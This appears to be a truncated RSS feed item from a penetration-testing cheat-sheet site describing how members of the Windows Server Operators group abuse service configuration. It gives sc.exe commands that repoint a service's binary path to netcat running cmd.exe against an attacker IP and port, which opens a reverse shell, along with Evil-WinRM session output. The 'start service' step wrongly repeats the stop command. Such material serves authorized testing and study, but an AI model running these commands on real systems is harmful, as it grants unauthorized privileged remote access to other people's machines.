channel.title: Server Operators on TLDRBins
channel.description: Recent content in Server Operators on TLDRBins

item.title: Server Operators
item.description: Abuse #1: Change service path 1. Change service path # Assume nc.exe is uploaded sc.exe config <SERVICE> binPath= "C:\ProgramData\nc.exe -e cmd.exe <LOCAL_IP> <LOCAL_PORT>" *Evil-WinRM* PS C:\windows\tasks> sc.exe config VSS binpath="C:\windows\tasks\nc.exe -e cmd 10.10.14.44 443" [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop <SERVICE> *Evil-WinRM* PS C:\windows\tasks> sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started. # Start service sc.exe stop <SERVICE> *Evil-WinRM* PS C:\windows\tasks> sc.
